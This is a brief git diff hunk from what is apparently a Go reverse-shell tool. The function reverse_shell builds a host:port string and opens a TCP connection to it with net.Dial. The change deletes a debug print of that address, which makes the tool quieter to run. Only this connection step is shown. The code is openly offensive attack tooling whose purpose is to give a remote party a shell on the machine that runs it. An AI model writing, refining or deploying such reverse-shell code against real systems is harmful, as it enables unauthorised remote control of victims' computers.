@@ -19,7 +19,6 @@ func reverse_shell(host string, port string) {
 	stdout := os.Stdout
 
 	full_conn := host + ":" + port
-	fmt.Println(full_conn)
 
 	conn, err := net.Dial("tcp", full_conn) // TCP call on IP:PORT
 	var i int = 0
